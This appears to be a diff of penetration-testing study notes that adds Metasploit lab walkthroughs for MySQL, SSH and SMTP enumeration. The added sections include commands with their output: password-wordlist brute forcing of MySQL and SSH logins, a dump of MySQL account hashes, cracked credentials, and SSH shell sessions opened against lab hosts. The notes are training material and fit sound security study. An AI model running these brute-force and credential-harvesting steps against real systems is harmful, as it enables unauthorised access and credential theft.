@@ -423,6 +423,8 @@ db_import /root/windows_server_2012
 hosts
 services
 vulns
+loot
+creds
 ```
 
 ![](.gitbook/assets/image-20230412190333138.png)
@@ -551,7 +553,7 @@ set RHOSTS 192.41.167.3
 run
 ```
 
-### Service Enumeration
+### Services Enumeration
 
 > 📌🔬 Check the [Enumeration Section labs here](../assessment-methodologies/3-enumeration.md) for basic `nmap` enumeration.
 
@@ -576,6 +578,7 @@ setg RHOSTS <TARGET_IP>
 > **`auxiliary/scanner/ftp/ftp_version`**
 
 ```bash
+ip -br -c a
 workspace -a FTP_ENUM
 search portscan
 use auxiliary/scanner/portscan/tcp
@@ -633,6 +636,7 @@ run
 > **`auxiliary/scanner/smb/smb_version`**
 
 ```bash
+ip -br -c a
 setg RHOSTS 192.132.155.3
 workspace -a SMB_ENUM
 search type:auxiliary name:smb
@@ -701,6 +705,7 @@ run
 - Remember to specify the correct port and if targeting a web server with SSL enabled, in the options.
 
 ```bash
+ip -br -c a
 setg RHOSTS 192.106.226.3
 setg RHOST 192.106.226.3
 workspace -a HTTP_ENUM
@@ -858,6 +863,277 @@ curl http://192.106.226.3/secure/
 #### [MYSQL](../assessment-methodologies/3-enumeration/mysql-enum.md)
 
 > 🔬 [Metasploit - MySQL Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=120)
+
+```bash
+ip -br -c a
+setg RHOSTS 192.64.22.3
+setg RHOST 192.64.22.3
+workspace -a MYSQL_ENUM
+```
+
+> **`auxiliary/admin/mysql/mysql_enum`**
+
+```bash
+search mysql_enum
+use auxiliary/admin/mysql/mysql_enum
+info
+set USERNAME root
+set PASSWORD twinkle
+run
+```
+
+```bash
+[*] 192.64.22.3:3306 - Running MySQL Enumerator...
+[*] 192.64.22.3:3306 - Enumerating Parameters
+[*] 192.64.22.3:3306 -  MySQL Version: 5.5.61-0ubuntu0.14.04.1
+[*] 192.64.22.3:3306 -  Compiled for the following OS: debian-linux-gnu
+[*] 192.64.22.3:3306 -  Architecture: x86_64
+[*] 192.64.22.3:3306 -  Server Hostname: victim-1
+[*] 192.64.22.3:3306 -  Data Directory: /var/lib/mysql/
+[*] 192.64.22.3:3306 -  Logging of queries and logins: OFF
+[*] 192.64.22.3:3306 -  Old Password Hashing Algorithm OFF
+[*] 192.64.22.3:3306 -  Loading of local files: ON
+[*] 192.64.22.3:3306 -  Deny logins with old Pre-4.1 Passwords: OFF
+[*] 192.64.22.3:3306 -  Allow Use of symlinks for Database Files: YES
+[*] 192.64.22.3:3306 -  Allow Table Merge: 
+[*] 192.64.22.3:3306 -  SSL Connection: DISABLED
+[*] 192.64.22.3:3306 - Enumerating Accounts:
+[*] 192.64.22.3:3306 -  List of Accounts with Password Hashes:
+[+] 192.64.22.3:3306 -          User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
+[+] 192.64.22.3:3306 -          User: root Host: 891b50fafb0f Password Hash: 
+[+] 192.64.22.3:3306 -          User: root Host: 127.0.0.1 Password Hash: 
+[+] 192.64.22.3:3306 -          User: root Host: ::1 Password Hash: 
+[+] 192.64.22.3:3306 -          User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
+[+] 192.64.22.3:3306 -          User: root Host: % Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
+[+] 192.64.22.3:3306 -          User: filetest Host: % Password Hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
+[+] 192.64.22.3:3306 -          User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
+[+] 192.64.22.3:3306 -          User: guest Host: localhost Password Hash: *17FD2DDCC01E0E66405FB1BA16F033188D18F646
+[+] 192.64.22.3:3306 -          User: gopher Host: localhost Password Hash: *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
+[+] 192.64.22.3:3306 -          User: backup Host: localhost Password Hash: *E6DEAD2645D88071D28F004A209691AC60A72AC9
+[+] 192.64.22.3:3306 -          User: sysadmin Host: localhost Password Hash: *78A1258090DAA81738418E11B73EB494596DFDD3
+[*] 192.64.22.3:3306 -  The following users have GRANT Privilege:
+[...]
+```
+
+> **`auxiliary/admin/mysql/mysql_sql`**
+
+```bash
+search mysql_sql
+use auxiliary/admin/mysql/mysql_sql
+options
+set USERNAME root
+set PASSWORD twinkle
+run
+# set an SQL query
+set SQL show databases;
+run
+```
+
+```bash
+[*] 192.64.22.3:3306 - Sending statement: 'select version()'...
+[*] 192.64.22.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
+
+[*] 192.64.22.3:3306 - Sending statement: 'show databases;'...
+[*] 192.64.22.3:3306 -  | information_schema |
+[*] 192.64.22.3:3306 -  | mysql |
+[*] 192.64.22.3:3306 -  | performance_schema |
+[*] 192.64.22.3:3306 -  | upload |
+[*] 192.64.22.3:3306 -  | vendors |
+[*] 192.64.22.3:3306 -  | videos |
+[*] 192.64.22.3:3306 -  | warehouse |
+```
+
+> **`auxiliary/scanner/mysql/mysql_file_enum`**
+
+> **`auxiliary/scanner/mysql/mysql_hashdump`**
+
+> **`auxiliary/scanner/mysql/mysql_login`**
+
+```bash
+search mysql_login
+use auxiliary/scanner/mysql/mysql_login
+options
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set STOP_ON_SUCCESS false
+run
+```
+
+```bash
+[+] 192.64.22.3:3306 - 192.64.22.3:3306 - Success: 'root:twinkle'
+```
+
+> **`auxiliary/scanner/mysql/mysql_schemadump`**
+
+```bash
+search mysql_schemadump
+use auxiliary/scanner/mysql/mysql_schemadump
+options
+set USERNAME root
+set PASSWORD twinkle
+run
+```
+
+```bash
+[+] 192.64.22.3:3306 - Schema stored in:
+/root/.msf4/loot/20230413112948_MYSQL_ENUM_192.64.22.3_mysql_schema_807923.txt
+[+] 192.64.22.3:3306 - MySQL Server Schema
+ Host: 192.64.22.3
+ Port: 3306
+ ====================
+---
+- DBName: upload
+  Tables: []
+- DBName: vendors
+  Tables: []
+- DBName: videos
+  Tables: []
+- DBName: warehouse
+  Tables: []
+```
+
+> **`auxiliary/scanner/mysql/mysql_version`**
+
+```bash
+search type:auxiliary name:mysql
+use auxiliary/scanner/mysql/mysql_version
+options
+run
+```
+
+```bash
+[+] 192.64.22.3:3306 - 192.64.22.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
+# MySQL and Ubuntu versions enumerated!
+```
+
+> **`auxiliary/scanner/mysql/mysql_writable_dirs`**
+
+- Check the MySQL Enumerated data within MSF:
+
+```bash
+hosts
+services
+loot
+creds
+```
+
+![](.gitbook/assets/image-20230413133324466.png)
+
+#### [SSH](../assessment-methodologies/3-enumeration/ssh-enum.md)
+
+> 🔬 [Metasploit - SSH Login](https://attackdefense.com/challengedetails?cid=1526)
+
+```bash
+ip -br -c a
+setg RHOSTS 192.127.196.3
+setg RHOST 192.127.196.3
+workspace -a SSH_ENUM
+```
+
+> **`auxiliary/scanner/ssh/ssh_version`**
+
+```bash
+search type:auxiliary name:ssh
+use auxiliary/scanner/ssh/ssh_version
+options
+run
+```
+
+```bash
+[+] 192.127.196.3:22 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:19.04 service.protocol=ssh fingerprint_db=ssh.banner )
+# SSH-2.0-OpenSSH_7.9p1 and Ubuntu 19.04
+```
+
+> **`auxiliary/scanner/ssh/ssh_login`**
+
+```bash
+search ssh_login
+use auxiliary/scanner/ssh/ssh_login
+# for password authentication
+options
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+run
+```
+
+```bash
+[+] 192.127.196.3:22 - Success: 'sysadmin:hailey' ''
+[*] Command shell session 1 opened (192.127.196.2:37093 -> 192.127.196.3:22)
+[+] 192.127.196.3:22 - Success: 'rooty:pineapple' ''
+[*] Command shell session 2 opened (192.127.196.2:44935 -> 192.127.196.3:22)
+[+] 192.127.196.3:22 - Success: 'demo:butterfly1' ''
+[*] Command shell session 3 opened (192.127.196.2:39681 -> 192.127.196.3:22)
+[+] 192.127.196.3:22 - Success: 'auditor:xbox360' ''
+[*] Command shell session 4 opened (192.127.196.2:42273 -> 192.127.196.3:22)
+[+] 192.127.196.3:22 - Success: 'anon:741852963' ''
+[*] Command shell session 5 opened (192.127.196.2:44263 -> 192.127.196.3:22)
+[+] 192.127.196.3:22 - Success: 'administrator:password1' ''
+[*] Command shell session 6 opened (192.127.196.2:39997 -> 192.127.196.3:22)
+[+] 192.127.196.3:22 - Success: 'diag:secret' ''
+```
+
+- This module sets up SSH sessions
+
+![](.gitbook/assets/image-20230413143027661.png)
+
+> **`auxiliary/scanner/ssh/ssh_enumusers`**
+
+```bash
+search type:auxiliary name:ssh
+use auxiliary/scanner/ssh/ssh_enumusers
+options
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+run
+```
+
+```bash
+[+] 192.127.196.3:22 - SSH - User 'sysadmin' found
+[+] 192.127.196.3:22 - SSH - User 'rooty' found
+[+] 192.127.196.3:22 - SSH - User 'demo' found
+[+] 192.127.196.3:22 - SSH - User 'auditor' found
+[+] 192.127.196.3:22 - SSH - User 'anon' found
+[+] 192.127.196.3:22 - SSH - User 'administrator' found
+[+] 192.127.196.3:22 - SSH - User 'diag' found
+```
+
+#### [SMTP](../assessment-methodologies/3-enumeration/smtp-enum.md)
+
+> 🔬 [SMTP - Postfix Recon: Basics](https://www.attackdefense.com/challengedetails?cid=516)
+
+```bash
+ip -br -c a
+setg RHOSTS 192.8.115.3
+setg RHOST 192.8.115.3
+workspace -a SMTP_ENUM
+# Run a portscan to identify SMTP port, in this case is port 25
+```
+
+> **`auxiliary/scanner/smtp/smtp_enum`**
+
+```bash
+search type:auxiliary name:smtp
+use auxiliary/scanner/smtp/smtp_enum
+options
+run
+```
+
+```bash
+[+] 192.63.243.3:25 - 192.63.243.3:25 Users found: , admin, administrator, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, postmaster, proxy, sync, sys, uucp, www-data
+```
+
+> **`auxiliary/scanner/smtp/smtp_version`**
+
+```bash
+search type:auxiliary name:smtp
+use auxiliary/scanner/smtp/smtp_version
+options
+run
+```
+
+```bash
+[+] 192.8.115.3:25 - 192.8.115.3:25 SMTP 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.\x0d\x0a
+```
 
 ## Vulnerability Scanning With MSF
 
